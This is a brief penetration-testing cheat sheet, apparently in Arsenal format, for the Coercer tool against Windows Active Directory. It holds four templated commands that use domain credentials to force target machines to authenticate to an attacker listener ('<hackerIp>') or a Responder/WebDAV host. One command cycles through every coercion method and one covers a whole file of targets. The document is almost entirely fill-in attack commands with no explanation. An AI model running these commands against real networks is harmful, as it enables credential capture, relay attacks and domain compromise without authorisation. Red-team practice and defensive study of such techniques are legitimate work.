# Coercer

% adcs, certificate, windows, Active directory, template

## Coercer - try each method no pause
#plateform/linux #target/remote #cat/ATTACK
```
coerce coerce -d '<domain>' -u '<user>' -p '<password>' --listener <hackerIp> <targetIp> --always-continue
```

## Coercer - try each method to coerce
#plateform/linux #target/remote #cat/RECON
```
coerce coerce -d '<domain>' -u '<user>' -p '<password>' --listener <hackerIp> <targetIp> 
```

## Coercer - Webdav
#plateform/linux #target/remote #cat/RECON
```
coerce coerce -d '<domain>' -u '<user>' -p '<password>' --webdav-host '<ResponderMachineName>' <targetIp> 
```

## Coercer - List vulns many targets
#plateform/linux #target/remote #cat/RECON
```
coerce coerce -d '<domain>' -u '<user>' -p '<password>' --listener <hackerIp> --targets-file <PathToTargetFile> 
```